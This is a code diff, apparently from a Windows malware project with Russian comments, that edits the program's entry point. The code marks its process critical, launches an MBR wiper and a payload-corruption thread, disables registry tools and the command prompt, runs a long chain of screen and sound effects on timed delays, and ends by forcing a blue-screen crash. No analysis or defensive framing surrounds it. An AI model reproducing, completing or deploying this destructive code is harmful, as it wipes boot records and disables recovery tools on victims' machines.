@@ -1110,8 +1110,6 @@ DWORD WINAPI earthquake_shake(LPVOID lpvd) {
     return 0;
 }
 
-// ==================== ТОЧКА ВХОДА ====================
-
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Проверка прав администратора
     BOOL bIsAdmin = FALSE;
@@ -1132,11 +1130,10 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         ExitProcess(0);
     }
 
-    // Скрываем консоль
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     // ====== ЗАЩИТА СРАЗУ ======
-    ProcessIsCritical();
+    ProcessIsCritical();  // ← Оставляем, потому что TerminateThread больше нет!
 
     // Запускаем MBR Wiper
     CreateThread(0, 0, MBRWiper, 0, 0, 0);
@@ -1146,35 +1143,34 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", REG_DWORD, 1);
     reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", REG_DWORD, 2);
 
-    // Запускаем corrupt_payload
     CreateThread(0, 0, corrupt_payload, 0, 0, 0);
     Sleep(1000);
 
-    // ====== ЗАПУСКАЕМ ВСЕ ЭФФЕКТЫ ======
+    // ====== ЗАПУСКАЕМ ВСЕ ЭФФЕКТЫ (БЕЗ TerminateThread!) ======
     DWORD startTime = GetTickCount();
 
-    HANDLE t0 = CreateThread(0, 0, rgb_hell_drip, 0, 0, 0); sound_crush();
-    HANDLE t1 = CreateThread(0, 0, chromatic_abyss, 0, 0, 0); sound_glitch();
-    HANDLE t2 = CreateThread(0, 0, scanline_corrupt, 0, 0, 0); sound_scan();
-    HANDLE t3 = CreateThread(0, 0, blur_cascade, 0, 0, 0); sound_shatter();
+    HANDLE t0 = CreateThread(0, 0, rgb_hell_drip, 0, 0, 0); sound_crush(); Sleep(20000);
+    HANDLE t1 = CreateThread(0, 0, chromatic_abyss, 0, 0, 0); sound_glitch(); Sleep(20000);
+    HANDLE t2 = CreateThread(0, 0, scanline_corrupt, 0, 0, 0); sound_scan(); Sleep(20000);
+    HANDLE t3 = CreateThread(0, 0, blur_cascade, 0, 0, 0); sound_shatter(); Sleep(20000);
 
     HANDLE t4 = CreateThread(0, 0, text_maelstrom, 0, 0, 0);
-    HANDLE t5 = CreateThread(0, 0, vertex_shred, 0, 0, 0); sound_pulse();
+    HANDLE t5 = CreateThread(0, 0, vertex_shred, 0, 0, 0); sound_pulse(); Sleep(20000);
 
     HANDLE t6 = CreateThread(0, 0, double_blur, 0, 0, 0);
-    HANDLE t7 = CreateThread(0, 0, exec_blitz, 0, 0, 0); sound_blast();
+    HANDLE t7 = CreateThread(0, 0, exec_blitz, 0, 0, 0); sound_blast(); Sleep(20000);
 
-    HANDLE t8 = CreateThread(0, 0, xor_shred, 0, 0, 0); sound_demolish();
-    HANDLE t9 = CreateThread(0, 0, bitwise_chaos, 0, 0, 0); sound_annihilate();
-    HANDLE t10 = CreateThread(0, 0, sine_rip, 0, 0, 0);
-    HANDLE t11 = CreateThread(0, 0, random_blitz, 0, 0, 0);
+    HANDLE t8 = CreateThread(0, 0, xor_shred, 0, 0, 0); sound_demolish(); Sleep(20000);
+    HANDLE t9 = CreateThread(0, 0, bitwise_chaos, 0, 0, 0); sound_annihilate(); Sleep(20000);
+    HANDLE t10 = CreateThread(0, 0, sine_rip, 0, 0, 0); Sleep(20000);
+    HANDLE t11 = CreateThread(0, 0, random_blitz, 0, 0, 0); Sleep(20000);
 
-    HANDLE t12 = CreateThread(0, 0, spin_blur, 0, 0, 0); sound_spin();
-    HANDLE t13 = CreateThread(0, 0, squeeze_stretch, 0, 0, 0); sound_squeeze();
-    HANDLE t14 = CreateThread(0, 0, waterfall_shatter, 0, 0, 0); sound_waterfall();
-    HANDLE t15 = CreateThread(0, 0, sideways_slide, 0, 0, 0); sound_sideways();
-    HANDLE t16 = CreateThread(0, 0, screen_explode, 0, 0, 0); sound_explode();
-    HANDLE t17 = CreateThread(0, 0, earthquake_shake, 0, 0, 0); sound_quake();
+    HANDLE t12 = CreateThread(0, 0, spin_blur, 0, 0, 0); sound_spin(); Sleep(20000);
+    HANDLE t13 = CreateThread(0, 0, squeeze_stretch, 0, 0, 0); sound_squeeze(); Sleep(20000);
+    HANDLE t14 = CreateThread(0, 0, waterfall_shatter, 0, 0, 0); sound_waterfall(); Sleep(20000);
+    HANDLE t15 = CreateThread(0, 0, sideways_slide, 0, 0, 0); sound_sideways(); Sleep(20000);
+    HANDLE t16 = CreateThread(0, 0, screen_explode, 0, 0, 0); sound_explode(); Sleep(20000);
+    HANDLE t17 = CreateThread(0, 0, earthquake_shake, 0, 0, 0); sound_quake(); Sleep(20000);
 
     // ====== ЖДЁМ 6:20 ======
     DWORD elapsed = GetTickCount() - startTime;
@@ -1195,7 +1191,6 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // ====== ВЫЗЫВАЕМ 100% BSOD ======
     ForceBSOD();
 
-    // Если BSOD не сработал (что невозможно) — бесконечная блокировка
     Sleep(-1);
     return 0;
 }
